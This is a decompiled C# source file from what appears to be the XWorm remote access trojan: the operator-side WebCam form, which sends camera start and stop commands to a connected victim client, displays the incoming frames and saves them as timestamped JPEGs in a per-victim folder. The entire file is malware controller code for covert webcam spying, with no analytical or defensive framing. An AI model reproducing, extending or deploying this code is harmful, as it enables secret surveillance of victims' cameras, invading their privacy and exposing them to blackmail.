#define DEBUG
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;


namespace XWorm;

[DesignerGenerated]
public class WebCam : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private System.Windows.Forms.Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripStatusLabel4")]
	private ToolStripStatusLabel _ToolStripStatusLabel4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2ComboBox2")]
	private Guna2ComboBox _Guna2ComboBox2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton1")]
	private Guna2GradientButton _Guna2GradientButton1;

	public GClass5 gclass5_0;

	public string string_0;

	public int int_0;

	public Stopwatch stopwatch_0;

	public System.Windows.Forms.Timer Timer1;
	public StatusStrip StatusStrip1;
	public ToolStripStatusLabel ToolStripStatusLabel4;
	public Panel Panel2;
	public Guna2ComboBox Guna2ComboBox2;
	public Guna2GradientButton Guna2GradientButton1;
	public Guna2ComboBox Guna2ComboBox1;
	public PictureBox PictureBox1;
	public Guna2Panel Guna2Panel1;
	public Guna2Panel Guna2Panel3;
	public Guna2Panel Guna2Panel2;

	public WebCam()
	{
		base.Load += WebCam_Load;
		base.FormClosing += WebCam_FormClosing;
		int_0 = 0;
		stopwatch_0 = Stopwatch.StartNew();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.WebCam));
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.StatusStrip1 = new System.Windows.Forms.StatusStrip();
		this.ToolStripStatusLabel4 = new System.Windows.Forms.ToolStripStatusLabel();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.Guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
		this.Guna2ComboBox2 = new Guna.UI2.WinForms.Guna2ComboBox();
		this.Guna2ComboBox1 = new Guna.UI2.WinForms.Guna2ComboBox();
		this.Guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2Panel3 = new Guna.UI2.WinForms.Guna2Panel();
		this.Guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
		this.PictureBox1 = new System.Windows.Forms.PictureBox();
		this.StatusStrip1.SuspendLayout();
		this.Panel2.SuspendLayout();
		this.Guna2Panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		base.SuspendLayout();
		this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.ToolStripStatusLabel4.Click += new System.EventHandler(ToolStripStatusLabel4_Click);
		this.Guna2ComboBox2.SelectedIndexChanged += new System.EventHandler(Guna2ComboBox2_SelectedIndexChanged);
		this.Guna2GradientButton1.Click += new System.EventHandler(Guna2GradientButton1_Click);
		this.Timer1.Enabled = true;
		this.Timer1.Interval = 1000;
		this.StatusStrip1.BackColor = System.Drawing.Color.White;
		this.StatusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.StatusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.ToolStripStatusLabel4 });
		this.StatusStrip1.Location = new System.Drawing.Point(0, 295);
		this.StatusStrip1.Name = "StatusStrip1";
		this.StatusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
		this.StatusStrip1.Size = new System.Drawing.Size(497, 22);
		this.StatusStrip1.TabIndex = 10;
		this.StatusStrip1.Text = "StatusStrip1";
		this.ToolStripStatusLabel4.ActiveLinkColor = System.Drawing.Color.Red;
		this.ToolStripStatusLabel4.ForeColor = System.Drawing.Color.Black;
		this.ToolStripStatusLabel4.LinkColor = System.Drawing.Color.White;
		this.ToolStripStatusLabel4.Name = "ToolStripStatusLabel4";
		this.ToolStripStatusLabel4.Size = new System.Drawing.Size(71, 17);
		this.ToolStripStatusLabel4.Text = "[ AutoSave ]";
		this.ToolStripStatusLabel4.VisitedLinkColor = System.Drawing.Color.White;
		this.Panel2.Controls.Add(this.Guna2Panel1);
		this.Panel2.Controls.Add(this.Guna2Panel3);
		this.Panel2.Controls.Add(this.Guna2Panel2);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(0, 0);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(497, 32);
		this.Panel2.TabIndex = 30;
		this.Guna2Panel1.Controls.Add(this.Guna2ComboBox2);
		this.Guna2Panel1.Controls.Add(this.Guna2ComboBox1);
		this.Guna2Panel1.Controls.Add(this.Guna2GradientButton1);
		this.Guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Guna2Panel1.Location = new System.Drawing.Point(26, 0);
		this.Guna2Panel1.Name = "Guna2Panel1";
		this.Guna2Panel1.Size = new System.Drawing.Size(445, 21);
		this.Guna2Panel1.TabIndex = 36;
		this.Guna2ComboBox2.BackColor = System.Drawing.Color.Transparent;
		this.Guna2ComboBox2.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Guna2ComboBox2.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		this.Guna2ComboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.Guna2ComboBox2.FocusedColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox2.Font = new System.Drawing.Font("Segoe UI", 8.25f);
		this.Guna2ComboBox2.ForeColor = System.Drawing.Color.Black;
		this.Guna2ComboBox2.ItemHeight = 15;
		this.Guna2ComboBox2.Location = new System.Drawing.Point(132, 0);
		this.Guna2ComboBox2.Name = "Guna2ComboBox2";
		this.Guna2ComboBox2.Size = new System.Drawing.Size(213, 21);
		this.Guna2ComboBox2.TabIndex = 35;
		this.Guna2ComboBox1.BackColor = System.Drawing.Color.Transparent;
		this.Guna2ComboBox1.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.Dock = System.Windows.Forms.DockStyle.Right;
		this.Guna2ComboBox1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
		this.Guna2ComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
		this.Guna2ComboBox1.FocusedColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ComboBox1.Font = new System.Drawing.Font("Segoe UI", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Guna2ComboBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2ComboBox1.ItemHeight = 15;
		this.Guna2ComboBox1.Items.AddRange(new object[10] { "10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%" });
		this.Guna2ComboBox1.Location = new System.Drawing.Point(345, 0);
		this.Guna2ComboBox1.Name = "Guna2ComboBox1";
		this.Guna2ComboBox1.Size = new System.Drawing.Size(100, 21);
		this.Guna2ComboBox1.TabIndex = 28;
		this.Guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton1.Dock = System.Windows.Forms.DockStyle.Left;
		this.Guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton1.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton1.Image = XWorm_Resources.Play;
		this.Guna2GradientButton1.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton1.ImageSize = new System.Drawing.Size(15, 15);
		this.Guna2GradientButton1.Location = new System.Drawing.Point(0, 0);
		this.Guna2GradientButton1.Name = "Guna2GradientButton1";
		this.Guna2GradientButton1.Size = new System.Drawing.Size(132, 21);
		this.Guna2GradientButton1.TabIndex = 34;
		this.Guna2GradientButton1.Text = "Start";
		this.Guna2Panel3.Dock = System.Windows.Forms.DockStyle.Left;
		this.Guna2Panel3.Location = new System.Drawing.Point(0, 0);
		this.Guna2Panel3.Name = "Guna2Panel3";
		this.Guna2Panel3.Size = new System.Drawing.Size(26, 32);
		this.Guna2Panel3.TabIndex = 38;
		this.Guna2Panel2.Dock = System.Windows.Forms.DockStyle.Right;
		this.Guna2Panel2.Location = new System.Drawing.Point(471, 0);
		this.Guna2Panel2.Name = "Guna2Panel2";
		this.Guna2Panel2.Size = new System.Drawing.Size(26, 32);
		this.Guna2Panel2.TabIndex = 37;
		this.PictureBox1.BackColor = System.Drawing.Color.White;
		this.PictureBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.PictureBox1.ErrorImage = null;
		this.PictureBox1.InitialImage = null;
		this.PictureBox1.Location = new System.Drawing.Point(0, 32);
		this.PictureBox1.Margin = new System.Windows.Forms.Padding(2);
		this.PictureBox1.Name = "PictureBox1";
		this.PictureBox1.Size = new System.Drawing.Size(497, 263);
		this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.PictureBox1.TabIndex = 4;
		this.PictureBox1.TabStop = false;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(497, 317);
		base.Controls.Add(this.PictureBox1);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.StatusStrip1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "WebCam";
		this.Text = "WebCam";
		this.StatusStrip1.ResumeLayout(false);
		this.StatusStrip1.PerformLayout();
		this.Panel2.ResumeLayout(false);
		this.Guna2Panel1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!gclass5_0.bool_0)
			{
				Close();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	public void method_0(MemoryStream b)
	{
		try
		{
			string text = Path.Combine(Application.StartupPath, "ClientsFolder", string_0, "WebCam");
			Image.FromStream(b).Save(text + "\\" + DateAndTime.Now.ToString("MM-dd-yyyy HH;mm;ss;fff") + ".jpg", ImageFormat.Jpeg);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ToolStripStatusLabel4.ForeColor = Color.Black;
			ProjectData.ClearProjectError();
		}
	}

	private void WebCam_Load(object sender, EventArgs e)
	{
		Guna2ComboBox1.Text = "10%";
		Guna2GradientButton1.PerformClick();
	}

	private void WebCam_FormClosing(object sender, FormClosingEventArgs e)
	{
		byte[] array = Module0.smethod_6("ENDCam");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void ToolStripStatusLabel4_Click(object sender, EventArgs e)
	{
		if (ToolStripStatusLabel4.ForeColor == Color.Green)
		{
			ToolStripStatusLabel4.ForeColor = Color.Black;
			return;
		}
		try
		{
			if (PictureBox1.Image != null)
			{
				string text = Path.Combine(Application.StartupPath, "ClientsFolder", string_0, "WebCam");
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				Process.Start(text);
				ToolStripStatusLabel4.ForeColor = Color.Green;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2GradientButton1_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(Guna2GradientButton1.Text, "Start", TextCompare: false) == 0)
		{
			byte[] array = Module0.smethod_6("Cam" + GClass19.string_0 + Guna2ComboBox2.SelectedIndex + GClass19.string_0 + Guna2ComboBox1.Text.Replace("%", "").ToString());
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
			Guna2GradientButton1.Text = "Stop";
			Guna2GradientButton1.Image = XWorm_Resources._Stop;
		}
		else
		{
			byte[] array2 = Module0.smethod_6("CLOSECam");
			GClass5 gClass2 = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass2.method_1((byte[])a0);
			}, array2);
			Guna2GradientButton1.Text = "Start";
			Guna2GradientButton1.Image = XWorm_Resources.Play;
		}
	}

	private void Guna2ComboBox2_SelectedIndexChanged(object sender, EventArgs e)
	{
		byte[] array = Module0.smethod_6("CLOSECam");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
		Guna2GradientButton1.Text = "Start";
		Guna2GradientButton1.Image = XWorm_Resources.Play;
	}
}